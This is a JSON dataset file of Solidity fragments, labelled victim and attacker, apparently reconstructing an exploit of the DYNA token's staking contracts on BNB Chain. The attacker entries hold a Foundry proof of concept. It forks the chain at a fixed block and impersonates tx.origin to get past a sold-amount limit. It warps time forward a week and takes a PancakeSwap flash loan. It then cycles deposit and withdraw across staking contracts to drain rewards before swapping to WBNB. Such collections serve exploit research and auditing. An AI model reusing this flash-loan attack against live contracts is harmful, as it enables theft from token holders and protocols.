[
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "_maxSoldAmount",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "_setMaxSoldAmount",
    "original_code": "    function _setMaxSoldAmount(uint256 maxvalue) external onlyOwner {\n        require(maxvalue >= 10**6 * 10**18, \"_maxSoldAmount must be greater than or equal to 0.1% total supply\");\n        _maxSoldAmount = maxvalue;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    //function balanceOf(address account) external override view returns (uint256) {\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() external view override returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(uint256 _stakeAmount) external {\n        require(enabled, \"Staking is not enabled\");\n        require(\n            _stakeAmount > 0,\n            \"StakingDYNA: stake amount must be greater than 0\"\n        );\n        token.transferFrom(msg.sender, address(this), _stakeAmount);\n        StakeDetail storage stakeDetail = stakers[msg.sender];\n        if (stakeDetail.firstStakeAt == 0) {\n            stakeDetail.principal = stakeDetail.principal.add(_stakeAmount);\n            stakeDetail.firstStakeAt = stakeDetail.firstStakeAt == 0\n                ? block.timestamp\n                : stakeDetail.firstStakeAt;\n            stakeDetail.lastProcessAt = block.timestamp;\n        } else {\n            stakeDetail.principal = stakeDetail.principal.add(_stakeAmount);\n        }\n\n        emit Deposit(msg.sender, _stakeAmount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() external view override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() external view override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() external view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IDYNA",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 listLength = StakingRewardList.length;\n        for (uint256 i; i < listLength; ++i) {\n            uint256 amount = DYNA.balanceOf(address(this));\n            DYNA.transfer(address(StakingRewardList[i]), amount);\n            StakingRewardList[i].deposit(amount);\n            StakingRewardList[i].withdraw(amount);\n        }\n        DYNA.transfer(address(Pair), flashLoanAmount * 100_000 / 9975 / 9 + 1000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 25_879_486);\n        cheats.label(address(DYNA), \"DYNA\");\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(StakingDYNA), \"StakingDYNA\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        StakingRewardFactory();\n        DYNA.transfer(address(Pair), 1); //\n        DYNA.transfer(tx.origin, 1e17);\n        //\n        cheats.startPrank(tx.origin);\n        // Bypass Sold Amount Limit\n        DYNA.transfer(address(Pair), 1); //\n        cheats.stopPrank();\n        //\n        cheats.warp(block.timestamp + 7 * 24 * 60 * 60);\n        // deposit a week ago\n        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;\n        Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));\n        DYNAToWBNB();\n\n        emit log_named_decimal_uint(\"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IStakingDYNA",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(uint256 _redeemAmount) external {\n        require(enabled, \"Staking is not enabled\");\n        StakeDetail storage stakeDetail = stakers[msg.sender];\n        require(stakeDetail.firstStakeAt > 0, \"StakingDYNA: no stake\");\n\n        uint256 interest = getInterest(msg.sender);\n\n        uint256 claimAmount = interest.mul(_redeemAmount).div(\n            stakeDetail.principal\n        );\n\n        uint256 remainAmount = interest.sub(claimAmount);\n\n        stakeDetail.lastProcessAt = block.timestamp;\n        require(\n            stakeDetail.principal >= _redeemAmount,\n            \"StakingDYNA: redeem amount must be less than principal\"\n        );\n        stakeDetail.principal = stakeDetail.principal.sub(_redeemAmount);\n        stakeDetail.pendingReward = remainAmount;\n        require(\n            token.transfer(msg.sender, _redeemAmount.add(claimAmount)),\n            \"StakingDYNA: transfer failed\"\n        );\n        emit Redeem(msg.sender, _redeemAmount.add(claimAmount));\n    }\n}\n",
    "description": ""
  }
]